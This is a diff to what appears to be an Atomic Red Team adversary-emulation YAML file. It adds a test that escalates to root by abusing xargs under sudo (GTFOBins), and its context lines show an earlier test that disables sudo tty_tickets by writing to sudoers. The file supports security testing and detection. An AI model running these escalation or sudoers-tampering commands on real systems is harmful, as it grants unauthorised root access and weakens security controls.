@@ -127,3 +127,28 @@ atomic_tests:
       sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"
       sudo visudo -c -f /usr/local/etc/sudoers
      
+
+- name: Sudo privilege escalation via xargs (GTFOBins)
+  auto_generated_guid: cf5db4dc-4232-4e66-a794-f8aed55b7993
+  description: |
+    Abuses xargs with `-a /dev/null` to execute a command with no input.
+    When `xargs` is permitted to run as root via sudo, the command runs as root (GTFOBins).
+    Reference: https://gtfobins.github.io/gtfobins/xargs/
+
+  supported_platforms:
+    - linux
+
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if xargs is installed.
+    prereq_command: |
+      if [ ! -x "$(command -v xargs)" ]; then exit 1; else exit 0; fi;
+    get_prereq_command: |
+      (which apt-get && sudo apt-get install -y findutils)||(which yum && sudo yum install -y findutils)
+
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      sudo xargs -a /dev/null sh -c id
